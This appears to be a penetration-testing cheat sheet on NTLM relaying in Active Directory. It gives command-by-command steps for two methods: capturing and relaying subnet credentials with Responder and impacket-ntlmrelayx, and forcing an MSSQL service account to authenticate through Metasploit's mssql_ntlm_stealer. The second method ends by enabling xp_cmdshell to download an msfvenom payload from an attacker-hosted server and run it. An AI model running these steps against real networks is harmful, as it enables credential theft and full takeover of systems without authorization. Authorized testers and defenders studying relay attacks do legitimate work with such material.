[https://pentest.party/notes/ad/ntlm-relaying](https://pentest.party/notes/ad/ntlm-relaying)

# Method 1 – Responder (requires users on same subnet to pass valid credentials)

Responder will passively listen and capture live NTLM credentials from users attempting to authenticate to services across the network. Attackers will only be able to see requests from users in the same subnet, so <attack_ip> needs to either be in the same subnet as the target host or the target users. `impacket-ntlmrelayx` will pass those live NTLM credentials to the target host on the service provided (SMB, RPC, MSSQL, etc) and potentially allow for unauthorized access as that user. Access is dependent on whether or not that user/service account has access to the target, service. If access is granted, it will be at that user level.

1.  If targeting SMB on the <target_ip>, SMB signing needs to be disabled in order for successful NTLM relaying. Targets can be validated using `netexec`.
```
netexec smb 192.168.1.0/24 --gen-relay-list relay_list.txt
```
2. Configure Responder:
```
sudo nano /etc/responder/Responder.conf
```
- In order for Responder and `impacket-ntlmrelayx` to operate together, modify the `responder.conf` file and disable the HTTP and SMB servers (as `ntlmrelayx` will be both the SMB and HTTP server).
	- Set SMB and HTTP to "Off"
3. Start Responder:
```
sudo responder –I eth0 –v -f /path/to/savefile
```
4. Start `impacket-ntlmrelayx`:
```
sudo impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server –smb2support --no-multirelay -i -t <service_protocol>://<target_IP>:<target_port>
```
5. Wait for users on the subnet to attempt to authenticate into target services.
	- Once connection is established identify local_port (typically port 11000, 11001, ..02, ..03).
6. Start `netcat` on the local port
```
sudo nc 127.0.0.1 <local_port>
```
7. Pwn.

# Method  2 – Metasploit MSSQL NTLM Stealer(requires pre-captured cleartext user credentials)

MSSQL NTLM Stealer uses pre-captured cleartext user credentials to gain system level access to a MSSQL server using `impacket-ntlmrelayx`. This will grant system level access regardless of the access level of the user credentials.

- Understanding the Vulnerability
MSSQL servers often have the `xp_dirtree` stored procedure enabled by default. This procedure allows for directory traversal on the server's file system. However, when this procedure is called, it can also trigger the SQL Server to attempt authentication to a specified network share (SMB server).

- NTLM Authentication
NTLM (NT LAN Manager) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. When an NTLM authentication request is made, a hash of the user's credentials is sent over the network. If an attacker can capture this hash, they can potentially crack it to retrieve the user's plain-text password or potentially relay it to another target.

- The Attack Vector
The `mssql_ntlm_stealer` module initiates the attack by executing the `xp_dirtree` procedure on the targeted MSSQL server. It specifies a network path that points to the attacker's SMB server. The MSSQL server attempts to authenticate to this SMB server using NTLM authentication, thus sending the NTLM hash.

- Capturing the Hash
The attacker's SMB server, set up to listen for incoming authentication attempts, captures the NTLM hash sent by the MSSQL server. This captured hash can then be cracked offline using various tools to reveal the user's password or relayed to another host.

This module can be used to help capture or relay the LM/NTLM credentials of the account running the remote SQL Server service. The module will use the supplied credentials to connect to the target SQL Server instance and execute the native `xp_dirtree` or `xp_fileexist` stored procedure. The stored procedures will then force the service account to authenticate to the system defined in the SMBProxy option. In order for the attack to be successful, the SMB capture or relay module must be running on the system defined as the SMBProxy. The database account used to connect to the database should only require the "PUBLIC" role to execute. Successful execution of this attack usually results in local administrative access to the Windows system. Specifically, this works great for relaying credentials between two SQL Servers using a shared service account to get shells. However, if the relay fails, then the LM hash can be reversed using the Halflm rainbow tables and john the ripper.

1. Start `impacket-ntlmrelayx`:
```
sudo impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server –smb2support --no-multirelay -i -t mssql://<target_IP>:<target_port>
```
- **Note**: `impacket-ntlmrelayx` needs to be pointed at the MSSQL target you intended to gain privileged access to.
2. Pre-generate payload:
```
msfvenom -p <payload> <options>
```
- **Note**: Host payload on an accessible HTTP server to push to targets later.
3. Pre-start multihandler for payload:
```
msfconsole use multi/handler
Show options
Show payloads
Set PAYLOAD <payload>
Run
```
4. Start msfconsole `mssql_ntlm_stealer`:
```
Msfconsole
use auxiliary/admin/mssql/mssql_ntlm_stealer
Show options
Set RHOSTS <target_ip>
Set RPORT <target_ip>
Set SMBPROXY <attack_ip>
Set USERNAME
Set PASSWORD
Set DOMAIN
Set USE_WINDOWS_AUTHENT True
Run
```
- **Note**:RHOSTS must be a target running MSSQL
- **Note**: USERNAME:PASSWORD must be able to authenticate into MSSQL on that server, cannot be relayed back to the same IP.
5. A successful `ntmlrelayx` capture will output stating "SUCCED" followed by a `127.0.01:11000`.
6. Start `netcat` on the local port to access the captured session:
```
nc 127.0.0.1 11000
```

7. Privilege Escalate:
```
enable_xp_cmdshell
xp_cmdshell "powershell.exe -c iwr –uri <http_hosted_payload> -outfile <local_save_location>\payload.exe"
xp_cmdshell "powershell.exe -c <local_save_location>\payload.exe"
```
8. Pwn.